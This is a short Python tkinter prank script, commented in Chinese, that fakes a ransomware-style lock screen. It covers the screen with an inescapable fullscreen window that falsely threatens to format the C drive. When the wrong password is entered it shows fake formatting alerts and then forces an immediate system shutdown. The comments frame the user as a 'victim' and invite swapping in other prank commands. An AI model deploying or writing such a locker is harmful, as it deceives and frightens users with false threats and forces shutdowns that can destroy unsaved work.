import tkinter as tk
from tkinter import *
from tkinter import messagebox  # 弹出提示框
from time import sleep  # 等待
import os

# 定义窗口
window = tk.Tk()
# 窗体边框消失，没有关闭按钮，也没有运行图标
window.overrideredirect(True)

# 设置窗口宽和高
window.config(bg='black')  # 窗口背景颜色设置为纯黑，black意思为黑色
w = window.winfo_screenwidth()  # 获取屏幕分辨率：宽
h = window.winfo_screenheight()  # 获取屏幕分辨率：高
window.geometry("%dx%d" % (w, h))  # 将获取到的宽和高设为窗口大小，即全屏
window.attributes("-topmost", True)  # 保持窗口在最前面

a = w / 2 - 350  # 文本横向位置
b = h / 2 - 200  # 文本纵向位置

c = w / 2 - 20  # 输入框横向位置
d = h / 2  # 输入框纵向位置

e = w / 2 - 30  # 按钮横向位置
f = h / 2 + 180  # 按钮纵向位置

# 定义密码判断函数
def passwd():
    password = P.get()  # 从输入框中获取输入内容

    # 把获取的内容和原密码作比较
    if password == 'xiaobai':  # 这里自己设置一个密码，为了方便演示就设置为xiaobai了
        # 如果密码正确，则弹出提示框，并且关闭窗口
        tk.messagebox.showinfo(message='密码正确！')
        window.destroy()
        pass
    else:
        # 如果密码错误，则弹出提示框，并通过os模块执行cmd的指令（这里为关机指令，也可以换成其它的恶搞指令哦~~）
        tk.messagebox.showerror(message='密码错误 磁盘即将格式化！')
        sleep(3)  # 等待3秒，造成正在格式化的假象
        tk.messagebox.showerror(message='磁盘已格式化！！！')
        os.system('shutdown -s -t 00')  # 执行关机指令
        pass


# 窗口显示内容，告诉“受害者”当前情况和需要密码解开的信息，格式化C盘是吓唬“受害者”的，其实强行关机也没啥事儿，就是搞心态
tk.Label(window, text='请输入密码：', bg='black', fg='red', font=("Airal", 30), width=15, height=2).place(x=a + 80, y=b + 180)
tk.Label(window, text='电脑已被锁，请联系小白获得密码\n\n   若强行关机，将格式化C盘！！！\n\n     输入错误也会格式化C盘！！！', bg='black', fg='red',
         font=("Airal", 30), width=40, height=6).place(x=a - 50, y=b - 100)

# 创建“确定”按钮
result_button = Button(window, command=passwd, text=" 确 定 ", bg='black', fg='red')
result_button.place(x=e, y=f, height=50, width=100)

# 设置输入框
P = tk.StringVar()
entry = tk.Entry(window, textvariable=P)
entry.place(x=c, y=d, height=50, width=300)

# 保持窗口持续运行
window.mainloop()